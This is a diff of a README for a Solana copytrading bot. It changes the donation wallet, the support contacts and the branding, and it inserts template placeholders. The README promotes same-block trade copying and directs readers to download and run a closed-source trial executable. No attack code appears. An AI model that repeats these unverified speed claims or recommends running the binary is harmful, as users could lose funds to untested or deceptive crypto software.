@@ -1,26 +1,25 @@
-# Solana "Block-Speed" Copytrading Bot in Rust 🚀
+# Solana "Block-Speed" Copytrading Bot in Rust 🍳
+![GitHub Repo stars](https://img.shields.io/github/stars/sinniez/Rust-Copy-Trading-Tool)
 
-## Overview
-
-Tired of watching trades whiz by? Introducing the **Solana Block-Speed Copytrading Bot** in **Rust** 🦀. This bot is engineered for **extreme speed**, letting you mirror trades in (potentially) the same block. Built from the ground up in Rust for peak performance and rock-solid reliability. Get ready to ride the wave!
+Tired of watching trades whiz by? Introducing the **Solana Block-Speed Copytrading Tool** in **Rust** 🦀. This bot is engineered for **extreme speed**, letting you mirror trades in (potentially) the same block. Built from the ground up in Rust for peak performance and rock-solid reliability. Get ready to ride the wave!
 
 ---
 
 ## Why This Bot Kicks Ass
 
-### ⚡️ **Rust: The Secret Sauce**
+###  **Rust: The Secret Sauce**
 -   **Unleash the Speed**: Rust is built for speed, and this bot *demolishes* latency. We're talking ultra-fast transaction parsing and lightning-quick RPC handling. You'll be trading faster than you can say "to the moon!"
 
-### 🎯 **Block-Level Action**
+###  **Block-Level Action**
 -   **Copycat in the Fast Lane**: This bot is designed to copy trades with the potential to execute *within the same block*. That's right – you could be riding shotgun on every trade as it happens.
 
-### 🔒 **Bulletproof Reliability**
+###  **Bulletproof Reliability**
 -   **Rust's Got Your Back**: Rust's memory safety and error handling mean a smoother, more reliable copytrading experience. Say goodbye to crashes and hello to consistent performance.
 
-### 📡 **Real-Time Intel**
+###  **Real-Time Intel**
 -   **Sniffing Out the Plays**: We're using a fast and efficient data pipeline to stay on top of the action and keep you in the loop. No more missing the signal!
 
-### 🛠️ **Battle-Ready Features**
+###  **Battle-Ready Features**
 -   **Built to Win**: We're packing essential tools for copytrading success:
     -   **Low-Latency Transactions**: Nail those trades with speed on platforms like Raydium and Pump.fun.
     -   **Advanced Options**: Designed to make your strategy the best it can be!
@@ -39,12 +38,15 @@ src/
 │   ├── swap.rs        # Token swap(buy/sell) functionalities in various Dexs
 │   └── monitor.rs        # Target wallet monitoring(and parse tx) in Dexs using geyser rpc, and normal rpc
 │       
+
+{{ edit_1 }}
 ├── dex/
 │   ├── pump_fun.rs        # Pump.fun
 │   ├── raydium.rs        # Raydium
 │   ├── meteora.rs        # Meteora
 │   └── orca.rs        # Orca
-│
+{{ edit_1 }}
+
 ├── services/
 │   ├── jito.rs        # Jito service provides ultra-fast transaction confirmation
 │   └── nextblock.rs        # NextBlock service provides the ultra-fast transaction confirmation in unique way
@@ -60,6 +62,7 @@ src/
 └── main.rs
 ```
 ---
+
 ## Trial Version
 🗂️ [solana-raypump-copytrading-bot(r7m-trial).zip](https://github.com/user-attachments/files/18871125/solana-raypump-copytrading-bot.r7m-trial.zip)
 
@@ -80,15 +83,15 @@ TOKEN_PERCENTAGE=1 #percentage
 3. Run `raypump-copytrading-bot.exe`.
 
 ---
-![image](https://github.com/user-attachments/assets/5067bce9-1077-4c9d-aa2f-18eab05cd18b)
 
+{{ edit_2 }}
 > ---[BUY]---
 * target: https://solscan.io/tx/5aaQDtXjyf4NDF3NKjjmC5s6Y8AhW3ieTpmB6Kxt6UGC2AowJ2xRTzFJo7KM4CVcpbphA2w76juGDdvqqgNTt1CF
 * copied: https://solscan.io/tx/4uPU2BRi7BJCTxp4kJQFTmLj5pmoAyKw7zCHNCPiP2NYK2HcqXfJr8gE6eF89VYPEy5VTFaRQf4DTUZNzttFQ73Z
 > ---[SELL]---
 * target: https://solscan.io/tx/22qnz4aBXqmeQbp6cnAogSVPNxSbEJr7tswch5QXLSG8Rvnb4SwDJFJ9RytpUVkUUQUtiy44fYwafF5CgiYjdVtp
 * copied: https://solscan.io/tx/3uBU12fQT14z88tiX1i1EH8XWXpFco4dU1QG8VEtYQyXtaSQXQB6AR7HBF4GtF9YDCa54Uw4xE7H7JPjBM9cETKM
----
+{{ edit_2 }}
 
 ### Test Result: Same Block
 
@@ -97,11 +100,15 @@ TOKEN_PERCENTAGE=1 #percentage
 - Dexscreener: https://dexscreener.com/solana/JD3VPqQ7pfHZ4h2zhALfvz5E7dantyVpsDUov1Lgpump
 
 ---
+
 ## Donate
 
-👉👌 6vT7nrqtbXDWVc8cRUtifxgfDZi19aW7qhcZg2hSepwb
+👌 BEd8mPdRWm43biKjN85oY19ZQte59MYp86YB8Aomaxi
 
 ---
+
 ## Support
 
-For support and further inquiries, please connect via Telegram: 📞 [jwest951227](https://t.me/jwest951227).
+For support and further inquiries, please contact me 
+- Telegram: @tarpan_tg
+- Discord: @tarpan_web3
